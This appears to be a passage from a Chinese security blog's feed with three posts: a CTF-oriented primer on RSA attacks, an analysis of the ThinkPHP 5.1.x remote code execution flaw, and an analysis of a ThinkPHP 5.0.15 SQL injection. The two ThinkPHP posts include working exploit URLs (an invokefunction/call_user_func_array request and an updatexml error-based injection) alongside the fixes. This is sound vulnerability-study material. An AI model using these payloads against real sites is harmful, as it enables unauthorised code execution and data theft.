    <content type="html"><![CDATA[<p>最近打比赛频频遇到各种学过又不会的密码学… 抽了点时间捣鼓了一下常见rsa攻击方法的原理，以后有时间继续填坑<br><a id="more"></a></p><h1 id="RSA计算过程"><a href="#RSA计算过程" class="headerlink" title="RSA计算过程"></a>RSA计算过程</h1><p>涉及3个参数： n e d, 其中 {n, d}为私钥，{n, e}为公钥</p><p><code>phi(n) = (p-1) * (q-1)</code><br>d为e膜phi(n)的逆元(phi(n)为n的欧拉函数)</p><p><code>ed ≡ 1 (mod phi(n))</code></p><p>加密解密过程：c密文，m明文<br>加密：<code>c ≡ m^e(mod n)</code><br>解密：<code>m ≡ c^d(mod n)</code></p><p>rsa中e为随机选取的一个数，一般为65537<br>n由两个大素数(p,q)之积组成，公钥{n,e}为公开的，要破解rsa就得求出d，d为e模phi(n)的逆元，要求出phi(n)，必须分解n求得p,q，从而求得<code>phi(n)=(p-1)*(q-1)</code></p><h1 id="代码基础"><a href="#代码基础" class="headerlink" title="代码基础"></a>代码基础</h1><ol><li>pow函数：<br>python底层实现平方乘和算法<br>解密：<code>m ≡ c^d(mod n)</code>使用pow函数<br><code>m=pow(c,d,n)</code></li></ol><h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><p>通过题目的数据文件，手工将参数提取：</p><ol><li>pem文件<br>1.1 私钥解密flag：<br><code>openssl rsautl -decrypt -in flag -inkey private.pem -out flag.txt</code><br>1.2 公钥加密flag<br><code>openssl  rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc</code><br>1.3 获取公钥的信息<br><code>openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></li></ol><ol start="2"><li>pcap文件</li><li>PPC模式</li></ol><h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><h2 id="直接分解n"><a href="#直接分解n" class="headerlink" title="直接分解n"></a>直接分解n</h2><p>n &lt; 512 bit: 直接分解， <a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a><br>n &gt; 512 bit: 使用后面方法</p><h2 id="利用公约数"><a href="#利用公约数" class="headerlink" title="利用公约数"></a>利用公约数</h2><p>题目特征：直接分解n无果后，尝试yafu。</p><p>两次公钥加密时使用的n1和n2有相同的素因子，则可以用欧几里得算法求出n1和n2的最大公因数，也就是其中一个素因子。</p><p>题目特征：给了若干个n，均不同，并且n都是2048bit、4096bit级别。</p><h2 id="Fermat方法与Pollard-rho方法"><a href="#Fermat方法与Pollard-rho方法" class="headerlink" title="Fermat方法与Pollard rho方法"></a>Fermat方法与Pollard rho方法</h2><p>p、q相差过大或相近时，可以使用Fermat方法与Pollard rho方法分解n。</p><p>开源项目: yafu</p><h2 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h2><p>当e(e=3)和明文过小时，可以使用这种攻击方案：</p><ol><li><code>m^e&lt;n</code>时<br>加密函数为：<code>c ≡ m^e(mod n)</code>， 若m^3&lt;n， 直接对密文c进行开三次方即可解出明文。<br>例题：</li></ol><ol start="2"><li><code>m^e&gt;n</code>时<br><code>c ≡ m^e + k*n</code>, 对<code>c+kn</code>进行三次开方，并对k进行枚举，即可求得明文m。</li></ol><h2 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h2><p>题目特征：一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。</p><p>分析：加密指数e选取较小，且使用相同加密指数进行群发消息(n不同)，可以使用广播攻击获得明文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c1 ≡ m^e(mod n1)</span><br><span class="line">c2 ≡ m^e(mod n2)</span><br><span class="line">c3 ≡ m^e(mod n3)</span><br></pre></td></tr></table></figure><p>利用中国剩余定理，解出<code>m^e</code>：<br><img src="http://static.zybuluo.com/Passer6y/4e9xj3u7mweeimm65v6arw5v/image_1d9c6jjt8bqdrao66julv1vn59.png" alt="image_1d9c6jjt8bqdrao66julv1vn59.png-78.6kB"></p><p>由于e很小，所以对<code>m^e</code>进行开方即可解出</p><h2 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h2><p>题目特征：e看起来很大就行了。</p><blockquote><p>d为e模phi(n)的逆元，e很大那么d就小</p></blockquote><p>脚本：<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></p><blockquote><p>这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：<br>import   sys<br>sys.setrecursionlimit(10000000)</p></blockquote><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>题目特征：若干次加密，每次n都一样，明文根据题意也一样即可。</p><p>使用相同模数n对相同的密文m进行加密(e不同)，可以使用共模攻击求出明文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 ≡ m^e1(mod n)</span><br><span class="line">c2 ≡ m^e2(mod n)</span><br></pre></td></tr></table></figure></p><p>易知: <code>gcd(e1,e2) = 1</code><br>有: <code>s*e1 + r*e2 = 1</code><br>推出：<code>s*e1 + r*e2 ≡ 1 (mod n)</code><br>用扩展版欧几里得算法可求得s、r</p><p>构造表达式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1^s ≡ m^(e1*s)(mod n)</span><br><span class="line">c2^r ≡ m^(e2*r)(mod n)</span><br></pre></td></tr></table></figure></p><p>联立：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1^s * c2^r ≡ m^[(e1*s)+(e2*r)] (mod n)</span><br><span class="line">c1^s * c2^r ≡ m^1 (mod n)</span><br></pre></td></tr></table></figure></p><p>解出明文：<code>m = (c1^s * c2^r)(mod n)</code></p><h1 id="一些例题"><a href="#一些例题" class="headerlink" title="一些例题"></a>一些例题</h1><h2 id="jarvisoj-Medium-RSA"><a href="#jarvisoj-Medium-RSA" class="headerlink" title="jarvisoj: Medium RSA"></a><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">jarvisoj: Medium RSA</a></h2><p>给了公钥和加密后的flag文件，先用openssl提取公钥信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem </span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p>分析, 给了我们m， 也就是phi(n)， 通过其求出p,q(①)，然后将n求出(②),通过表达式③将e的逆元d求出，从而将密文解出(⑤)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">①：modulus = (p-1)(p-1)</span><br><span class="line">②： n = p * q</span><br><span class="line">③： e*d ≡ 1 (mod modulus)</span><br><span class="line">④： 加密：c ≡ m^e (mod n)</span><br><span class="line">⑤： 解密：m ≡ c^d (mod n)</span><br></pre></td></tr></table></figure></p><p>尝试factor无解。<br>继续尝试用yafu分解m， 也就是phi(n),得到<code>p</code>和<code>q</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P39 = 319576316814478949870590164193048041239</span><br><span class="line">P39 = 275127860351348928173285174381581152299</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/ujevdi5cdxz1g9jzqe2kfun6/image_1d9eqhob11k6013iqqjilb7r9.png" alt="image_1d9eqhob11k6013iqqjilb7r9.png-17.8kB"></p><p>根据<code>e p q</code>生成私钥文件,这里用<a href="https://github.com/ohroot/rsatools" target="_blank" rel="noopener">rsatools</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 rsatool.py -o private.pem -e 65537 -p 319576316814478949870590164193048041239 -q 275127860351348928173285174381581152299</span><br></pre></td></tr></table></figure><p>接着拿着这个私钥用openssl解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsautl -decrypt -in flag.enc -inkey private.pem </span><br><span class="line">PCTF&#123;256b_i5_m3dium&#125;</span><br></pre></td></tr></table></figure></p><h2 id="jarvisoj-Hard-RSA"><a href="#jarvisoj-Hard-RSA" class="headerlink" title="jarvisoj: Hard RSA"></a><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">jarvisoj: Hard RSA</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 2 (0x2)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgEC</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>很显然，这里加密指数e为2，采用低加密指数攻击。</p><p>参考：</p><ol><li><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">jarvisoj</a></li><li><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF中RSA的常见攻击方法</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近打比赛频频遇到各种学过又不会的密码学… 抽了点时间捣鼓了一下常见rsa攻击方法的原理，以后有时间继续填坑&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="http://0day.design/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x 代码执行漏洞分析</title>
    <link href="http://0day.design/2019/04/15/ThinkPHP5.1.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/</id>
    <published>2019-04-15T08:46:00.000Z</published>
    <updated>2019-04-15T08:43:21.323Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><code>http://tprce/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p><p><img src="http://static.zybuluo.com/Passer6y/b3x19d6f1pu5yz4crewkthn1/image_1d8ffjpn01kouopob14c9i1mt19.png" alt="image_1d8ffjpn01kouopob14c9i1mt19.png-104.1kB"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从payload入手，在app处下断点跟入, <code>thinkphp/library/think/Request.php</code> 681行，处理兼容模式的url请求：</p><p><img src="http://static.zybuluo.com/Passer6y/sxdjzyjnpeifkhixgpxvs1z3/image_1d8fsee7h1red11t7d9e14omhgk1j.png" alt="image_1d8fsee7h1red11t7d9e14omhgk1j.png-388.5kB"></p><p>在<code>thinkphp/library/think/route/Rule.php</code> 947行<br><img src="http://static.zybuluo.com/Passer6y/o3ro7og9xlqyod0c96jda16v/image_1d8fvv9pa1aadflj4bu2b4pe81m.png" alt="image_1d8fvv9pa1aadflj4bu2b4pe81m.png-276.7kB"><br>可以看到其以<code>/</code>分割，分割成模块/控制器/操作方法</p><p>路由解析，分发到对应模块/控制器/操作方法<code>thinkphp/library/think/route/dispatch/Url.php</code> 37行</p><p><img src="http://static.zybuluo.com/Passer6y/e402mqf4g33n4fwyo4qv5dtp/image_1d8fu10u5a7gujrjgt18171llc9.png" alt="image_1d8fu10u5a7gujrjgt18171llc9.png-345.1kB"></p><p><code>thinkphp/library/think/route/dispatch/Module.php</code>  84行 <code>exec()</code>，实例化控制器<br><img src="http://static.zybuluo.com/Passer6y/v25l3t0ne9lfknxopicxs1jo/image_1d8g15qpv1foi12mihmd1826mvr36.png" alt="image_1d8g15qpv1foi12mihmd1826mvr36.png-294.2kB"></p><p>跟入该文件135行，该函数利用反射机制调用类方法，从而进行代码执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure></p><p>-&gt; <code>thinkphp/library/think/Container.php</code> 347行 <code>invokeFunction()</code>：<br><img src="http://static.zybuluo.com/Passer6y/9neklp8y2cmhalulvogad1bt/image_1d8g1mln71tog1ud81g4l2931d053j.png" alt="image_1d8g1mln71tog1ud81g4l2931d053j.png-387.1kB"></p><p>到这里就已经任意代码执行了。</p><blockquote><p>第一次接触反射机制，记录一下自己的理解，简单来说反射即根据目的地找来源，也就是根据已经实例化的对象来找其所属的类和类中的方法</p></blockquote><p>以上为ThinkPHP5.1.x的rce分析，ThinkPHP5.0.x有一些差异，以后来填坑。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>路由解析过程中没有对控制器的命名规则进行检测，导致我们可以操作任意控制器，官方修复加了正则只允许字符传入：<br><img src="http://static.zybuluo.com/Passer6y/i3q82hu9bdu5rdr6ghl1loxg/image_1d8g2fr8dkjqi9g1aah1unf18dj63.png" alt="image_1d8g2fr8dkjqi9g1aah1unf18dj63.png-173.9kB"></p><p>参考：</p><ol><li><a href="https://www.kancloud.cn/shaoguan/phpstudy/384102" target="_blank" rel="noopener">PHP反射机制原理与用法详解</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
      <category term="代码审计" scheme="http://0day.design/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5 SQL注入漏洞分析</title>
    <link href="http://0day.design/2019/04/15/ThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2019/04/15/ThinkPHP5 SQL注入漏洞分析/</id>
    <published>2019-04-15T01:46:00.000Z</published>
    <updated>2019-04-15T02:10:29.375Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>参考的红日安全团队的文章:<br><a href="https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md" target="_blank" rel="noopener">https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>第一次用composer安装源码，记录一下配置过程：<br>用brew安装composer：<code>brew install composer</code><br>更新一下composer：<code>composer self-update</code><br>安装国内镜像源：<code>composer config -g repo.packagist composer https://packagist.laravel-china.org</code></p><p>安装漏洞环境，thinkphp 5.0.15:<br><code>composer create-project --prefer-dist topthink/think=5.0.15 tp5.0.15</code><br>将 composer.json 文件的 require 字段设置成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将数据库文件，报错信息开启后，在控制器中index.php写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username/a&apos;);</span><br><span class="line">        db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">        return &apos;Update success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>paylaod:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://tp5.0.15/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/rsmd393b1y88p4ov3ef4t5on/image_1d8d5drlc17qg1na9vcv1tt013tt9.png" alt="image_1d8d5drlc17qg1na9vcv1tt013tt9.png-97.9kB"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>从demo代码入手：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(&apos;username/a&apos;);   // 强制类型转换成数组</span><br><span class="line">db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">return &apos;Update success&apos;;</span><br></pre></td></tr></table></figure></p><p>对其动态调试过程中，<code>request()-&gt;get()</code>，在thinkphp/library/think/Request.php 1093行对其数组的每个参数过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function filterExp(&amp;$value)</span><br><span class="line">&#123;</span><br><span class="line">    // 过滤查询特殊字符</span><br><span class="line">    if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) &#123;</span><br><span class="line">        $value .= &apos; &apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    // TODO 其他安全过滤</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>显然这个过滤规则是形同虚设的。</p><p>再来跟入: <code>db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);</code><br>从上面payload可以发现数组的第一个值为<code>inc</code>， 是tp5新增的链式查询操作:<code>https://www.kancloud.cn/manual/thinkphp5/135178</code>,<code>Auto-increment</code>即自动创建主键字段值。</p><p>thinkphp/library/think/db/Builder.php 726行insert 数据处理后进行拼接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function insert(array $data, $options = [], $replace = false)</span><br><span class="line">&#123;</span><br><span class="line">    // 分析并处理数据</span><br><span class="line">    $data = $this-&gt;parseData($data, $options);</span><br><span class="line">    if (empty($data)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $fields = array_keys($data);</span><br><span class="line">    $values = array_values($data);</span><br><span class="line"></span><br><span class="line">    $sql = str_replace(</span><br><span class="line">        [&apos;%INSERT%&apos;, &apos;%TABLE%&apos;, &apos;%FIELD%&apos;, &apos;%DATA%&apos;, &apos;%COMMENT%&apos;],</span><br><span class="line">        [</span><br><span class="line">            $replace ? &apos;REPLACE&apos; : &apos;INSERT&apos;,</span><br><span class="line">            $this-&gt;parseTable($options[&apos;table&apos;], $options),</span><br><span class="line">            implode(&apos; , &apos;, $fields),</span><br><span class="line">            implode(&apos; , &apos;, $values),</span><br><span class="line">            $this-&gt;parseComment($options[&apos;comment&apos;]),</span><br><span class="line">        ], $this-&gt;insertSql);</span><br><span class="line"></span><br><span class="line">    return $sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>thinkphp/library/think/db/Builder.php 118行选择了 inc模式 这里只是对数据进行清洗并没有对其进行过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">switch ($val[0]) &#123;</span><br><span class="line">    case &apos;exp&apos;:</span><br><span class="line">        $result[$item] = $val[1];</span><br><span class="line">        break;</span><br><span class="line">    case &apos;inc&apos;:</span><br><span class="line">        $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);</span><br><span class="line">        break;</span><br><span class="line">    case &apos;dec&apos;:</span><br><span class="line">        $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]);</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据清洗完后，value值被拼接进去：<br><img src="http://static.zybuluo.com/Passer6y/47w555l5o2ghy1cdikqnruoa/image_1d8f724ato7qe5bdh8h671j8p.png" alt="image_1d8f724ato7qe5bdh8h671j8p.png-307.5kB"></p><p>接着在对其一番预处理参数绑定后再进行查库，thinkphp/library/think/db/Connection.php 456行：<br><img src="http://static.zybuluo.com/Passer6y/931jhgsx7141uag4mtw3dlyw/image_1d8f7dfs829a11t8f5l1e8na8216.png" alt="image_1d8f7dfs829a11t8f5l1e8na8216.png-548.3kB"></p><p>同样的，从<code>thinkphp/library/think/db/Builder.php</code>可以知道，对<code>Inc</code>模式和对<code>dec</code>处理模式一样，所以同样也存在这个问题：<br><img src="http://static.zybuluo.com/Passer6y/ik5xnzy1lclz5e6ccyq4xkhg/image_1d8f9s34g1qjn1ki7irg12j71vbg3a.png" alt="image_1d8f9s34g1qjn1ki7irg12j71vbg3a.png-290.4kB"></p><p>修复过程，将<code>composer.json</code>版本修改成<code>5.0.17</code>,执行<code>composer update</code>:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">switch ($val[0]) &#123;</span><br><span class="line">    case 'exp':</span><br><span class="line">        $result[$item] = $val[1];</span><br><span class="line">        break;</span><br><span class="line">    case 'inc':</span><br><span class="line"><span class="deletion">-        $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);</span></span><br><span class="line"><span class="addition">+        $result[$item] = $item . '+' . floatval($val[2]);</span></span><br><span class="line">        break;</span><br><span class="line">    case 'dec':</span><br><span class="line"><span class="deletion">-        $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);</span></span><br><span class="line"><span class="addition">+        $result[$item] = $item . '-' . floatval($val[2]);</span></span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到改为拼接数组的键了：<br><img src="http://static.zybuluo.com/Passer6y/bbrlup3zenonuvidq1oi83iw/image_1d8faqgj6vr0nd8k9q8ouo9s44.png" alt="image_1d8faqgj6vr0nd8k9q8ouo9s44.png-409.2kB"></p><p>看到这里，其实有几个疑问的：</p><ol><li>为什么使用框架提供的参数方法过滤这么简单</li><li>将值换成键拼接还能注入吗？</li></ol><p>对于第一个问题，因为自己对thinkphp开发流程不熟悉原因，查阅<a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">文档</a>之后发现：<br><img src="http://static.zybuluo.com/Passer6y/8y2tjt5kivzwg0ma5y3bkk86/image_1d8f8g6lv13d5105o1hg7qmptdp20.png" alt="image_1d8f8g6lv13d5105o1hg7qmptdp20.png-81.1kB"><br>显然，就像上文分析的那样，默认情况下过滤就只有那些简单的关键字。</p><p>对于第二个问题，之前以为是客户端可控的传入变量的键，后来调试的时候发现是：<br><img src="http://static.zybuluo.com/Passer6y/q8k2jp76sdo9x9lv70pf04lu/image_1d8fbcjdf15o7fjp5sbc7a1o64u.png" alt="image_1d8fbcjdf15o7fjp5sbc7a1o64u.png-29.5kB"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>总结一下利用条件：</p><ol><li>过滤规则为默认，即无过滤</li><li>获取参数为array类型， 传入的三个参数，第一个为查询模式inc/dec，第二个未过滤为payload，第三个会进行<code>floatval()</code>类型转换，功能为递增的step</li><li>最后就是存在一个可控的insert操作了</li><li>开启报错才能报错注入</li></ol><h2 id="补更"><a href="#补更" class="headerlink" title="补更"></a>补更</h2><p>后来继续跟了一下tp5其他的注入，感觉都很鸡肋，甚至觉得不是洞..</p><p>利用思路都大同小异，传入数据默认不过滤，底层解析数据的也不过滤，最后进行一次字符串拼接。</p><p>参考：</p><ol><li><a href="https://packagist.laravel-china.org/" target="_blank" rel="noopener">Laravel China 社区维护的国内全量镜像</a></li><li><a href="https://github.com/Passer6y/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
      <category term="代码审计" scheme="http://0day.design/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
